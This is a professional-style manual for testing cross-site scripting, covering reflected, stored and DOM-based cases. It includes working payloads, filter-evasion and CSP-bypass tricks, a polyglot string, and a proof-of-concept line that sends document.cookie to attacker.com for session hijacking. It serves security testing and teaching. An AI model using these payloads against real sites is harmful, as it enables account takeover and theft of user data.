Comprehensive XSS Testing Manual

# Comprehensive XSS Testing Manual

_From Detection to Exploitation: A Professional's Guide to Cross-Site Scripting Vulnerabilities_

## 1\. Reflected XSS Testing

_When attacker input is immediately reflected in the server response_

### Methodology

1.  **Input Surface Mapping**
    *   Test all user-controllable inputs:
        *   URL parameters (`?q=<test>`)
        *   Form fields (search, contact forms)
        *   HTTP headers (`User-Agent`, `Referer`)
        *   File uploads (metadata)
2.  **Reflection Detection**
    
    1\. Inject unique tracer: xss\_<random8chars>
    2. Check for reflection in:
       - Raw HTML
       - JavaScript contexts
       - HTTP headers
       - DOM elements
    
3.  **Context Analysis & Exploitation**
    
    | Context | Test Payload | Bypass Technique |
    | --- | --- | --- |
    | HTML Body | `<svg onload=alert(1)>` | Case manipulation |
    | HTML Attribute | `" autofocus onfocus=alert(1) x="` | Hex/HTML encoding |
    | JavaScript Block | `'-alert(1)-'` | Template literals |
    
4.  **Verification**
    *   Test in multiple browsers (Chrome, Firefox, Safari)
    *   Check for CSP restrictions via DevTools Console

## 2\. Stored XSS Testing

_Persistent attacks stored server-side_

### Execution Flow

Identify Storage Mechanisms → Submit Probe Payload → Data Appears in:
   - Public Views
   - Admin Interfaces
   - API Responses
   → Test Contexts

### Critical Checks:

*   Session persistence (login/logout)
*   Multi-user impact
*   Admin privilege escalation
*   WAF/Filter evasion:
    
    ```
    <img src=x onerror="alert`1`">  // Backticks evade quote filters
    ```
    

## 3\. DOM-Based XSS Testing

_Client-side execution without server reflection_

### Investigation Toolkit

1.  **Source Identification**
    *   `document.location`
    *   `window.name`
    *   `postMessage` events
2.  **Sink Analysis**
    
    ```
    // Dangerous Sinks
    element.innerHTML = userInput;
    eval(userControlledData);
    document.write(unfilteredInput);
    ```
    
3.  **Debugging Process**
    1.  Set breakpoints in DevTools
    2.  Trace data flow from source to sink
    3.  Test with progressive payloads:
        
        ```
        1;console.log(source)
        1;alert(document.domain)
        ```
        

## Expert Techniques

### Filter Evasion Cheat Sheet

| Defense Mechanism | Bypass Method | Example |
| --- | --- | --- |
| HTML Encoding | SVG/Vector payloads | `<svg onload=alert(1)>` |
| Keyword Blacklisting | Line breaks/Tab characters | `<scr\r\nipt>` |
| CSP Restrictions | JSONP endpoints | `<script src=trusted.json?callback=alert>` |
| DOM Sanitization | Alternative events | `onpointerenter=alert(1)` |

### Automation Tips

*   Use Burp Suite's **Active Scanner** with custom XSS insertion points
*   Create **XSS polyglots** for multi-context testing:
    
    ```
    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
    ```
    

## Risk Assessment Matrix

| Severity | Impact Scenario | Proof of Concept |
| --- | --- | --- |
| Critical | Session hijacking via cookie theft | `document.location='http://attacker.com/?c='+document.cookie` |
| High | Keylogger implantation | `onkeypress=exfil(event.key)` |
| Medium | UI defacement | `document.body.innerHTML='HACKED'` |

## Recommended Practice Environments

1.  **PortSwigger Web Security Academy** (Free labs)
2.  **OWASP Juice Shop** (Self-hosted vulnerable app)
3.  **alert(1) to Win** (DOM XSS challenges)

**Final Note:** Always obtain proper authorization before testing. This guide is for educational purposes and ethical security assessments only.
